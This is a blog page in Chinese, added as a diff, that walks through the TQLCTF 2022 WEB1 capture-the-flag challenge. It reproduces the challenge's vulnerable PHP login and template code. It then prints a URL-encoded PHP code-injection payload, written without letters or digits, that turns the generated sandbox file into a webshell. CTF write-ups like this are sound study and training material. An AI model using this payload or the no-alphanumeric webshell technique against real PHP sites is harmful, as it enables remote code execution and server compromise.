@@ -1,0 +1,177 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TQLCTF_WEB1 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="看到题目刚开始是一个登录界面，发现有个路由可以任意文件读取
+读源码
+12345678910111213141516171819202122232425262728293031323334353637,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/p.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">TQLCTF_WEB1</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">TQLCTF_WEB1</h1>
+        <div class="stuff">
+            <span>二月 22, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>看到题目刚开始是一个登录界面，发现有个路由可以任意文件读取</p>
+<p>读源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//  index.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$hash_user</span> = md5(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$hash_pass</span> = <span class="string">&#x27;zsf&#x27;</span>.md5(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//filter</span></span><br><span class="line">        <span class="keyword">if</span> (strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^w/()*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[^w/*:.;()n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = preg_replace(<span class="string">&quot;/[a-z,A-Z,0-9&gt;?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line">                    <span class="variable">$template</span> = file_get_contents(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">                    <span class="variable">$content</span> = str_replace(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line">                    <span class="variable">$content</span> = str_replace(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line">                    <span class="variable">$content</span> = str_replace(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">                    <span class="variable">$content</span> = str_replace(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">                    file_put_contents(<span class="string">&#x27;sandbox/&#x27;</span>.<span class="variable">$hash_user</span>.<span class="string">&#x27;.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        setcookie(<span class="string">&quot;user&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], time()+<span class="number">3600</span>);</span><br><span class="line">        setcookie(<span class="string">&quot;pass&quot;</span>, <span class="variable">$hash_pass</span>, time()+<span class="number">3600</span>);</span><br><span class="line">        Header(<span class="string">&quot;Location:sandbox/<span class="subst">$hash_user</span>.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现index.php会把我们用户输入的内容替换掉tamplate的内容，我们看看tamplate的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;start_block&quot;</span>&gt; &lt;a title=<span class="string">&quot;开始&quot;</span> id=<span class="string">&quot;start_btn&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">  &lt;div id=<span class="string">&quot;start_item&quot;</span>&gt;</span><br><span class="line">    &lt;ul <span class="class"><span class="keyword">class</span>=&quot;<span class="title">item</span> <span class="title">admin</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">adminImg</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">   <span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">   $<span class="title">user</span> = ((<span class="title">string</span>)<span class="title">__USER__</span>);</span></span><br><span class="line"><span class="class">   $<span class="title">pass</span> = ((<span class="title">string</span>)<span class="title">__PASS__</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">   <span class="title">if</span>(<span class="title">isset</span>($<span class="title">_COOKIE</span>[&#x27;<span class="title">user</span>&#x27;]) &amp;&amp; <span class="title">isset</span>($<span class="title">_COOKIE</span>[&#x27;<span class="title">pass</span>&#x27;]) &amp;&amp; $<span class="title">_COOKIE</span>[&#x27;<span class="title">user</span>&#x27;] === $<span class="title">user</span> &amp;&amp; $<span class="title">_COOKIE</span>[&#x27;<span class="title">pass</span>&#x27;] === $<span class="title">pass</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Permission denied!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;ul <span class="class"><span class="keyword">class</span>=&quot;<span class="title">item</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">sitting_btn</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;系统设置&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">help_btn</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;使用指南 &lt;<span class="title">b</span>&gt;&lt;/<span class="title">b</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">about_btn</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;关于我们&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">li</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">logout_btn</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;退出系统&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot; <span class="title">class</span>=&quot;<span class="title">powered_by</span>&quot;&gt;<span class="title">__PUNC__</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">ul</span> <span class="title">id</span>=&quot;<span class="title">deskIcon</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">desktop_icon</span>&quot; <span class="title">id</span>=&quot;<span class="title">win5</span>&quot; <span class="title">path</span>=&quot;<span class="title">https</span>://<span class="title">image</span>.<span class="title">baidu</span>.<span class="title">com</span>/&quot;&gt; &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;../<span class="title">img</span>/<span class="title">icon4</span>.<span class="title">png</span>&quot;/&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>&quot;&gt;图片</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">right_cron</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">desktop_icon</span>&quot; <span class="title">id</span>=&quot;<span class="title">win6</span>&quot; <span class="title">path</span>=&quot;<span class="title">http</span>://<span class="title">www</span>.4399.<span class="title">com</span>/&quot;&gt; &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;../<span class="title">img</span>/<span class="title">icon5</span>.<span class="title">png</span>&quot;/&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>&quot;&gt;游戏</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">right_cron</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">desktop_icon</span>&quot; <span class="title">id</span>=&quot;<span class="title">win10</span>&quot; <span class="title">path</span>=&quot;../<span class="title">get_pic</span>.<span class="title">php</span>?<span class="title">image</span>=<span class="title">img</span>/<span class="title">haokangde</span>.<span class="title">png</span>&quot;&gt; &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;../<span class="title">img</span>/<span class="title">icon4</span>.<span class="title">png</span>&quot;/&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>&quot;&gt;&lt;<span class="title">b</span>&gt;好康的&lt;/<span class="title">b</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">right_cron</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">desktop_icon</span>&quot; <span class="title">id</span>=&quot;<span class="title">win16</span>&quot; <span class="title">path</span>=&quot;<span class="title">__WEBSITE__</span>&quot;&gt; &lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">icon</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;../<span class="title">img</span>/<span class="title">icon10</span>.<span class="title">png</span>&quot;/&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>&quot;&gt;&lt;<span class="title">b</span>&gt;你的网站&lt;/<span class="title">b</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">right_cron</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">taskBar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">leftBtn</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot; <span class="title">class</span>=&quot;<span class="title">upBtn</span>&quot;&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">rightBtn</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot; <span class="title">class</span>=&quot;<span class="title">downBtn</span>&quot;&gt;&lt;/<span class="title">a</span>&gt; &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">task_lb_wrap</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">task_lb</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们就可以想到代码注入，但是我们只能输入字符，我们利用php的特性无字母getshell</p>
+<p>参考p神的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p>playload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pass=&amp;punctuation=*/);%<span class="number">24</span>_%<span class="number">3</span>d[].[]%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">24</span>_[<span class="string">&#x27;&#x27;</span>]%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__%<span class="number">3</span>d%<span class="number">24</span>_.%<span class="number">24</span>__%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>_%<span class="number">3</span>d%<span class="number">2</span>b%<span class="number">2</span>b%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>__.%<span class="number">3</span>d%<span class="number">24</span>_%<span class="number">3</span>b%<span class="number">24</span>&#123;<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>__&#125;[_](%<span class="number">24</span>&#123;<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>__&#125;[__])%<span class="number">3</span>b<span class="comment">/*</span></span><br><span class="line"><span class="comment">&amp;user=12/*&amp;website=</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/G6BD5">GIXHXD0%252ALWEOUIK.png)</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
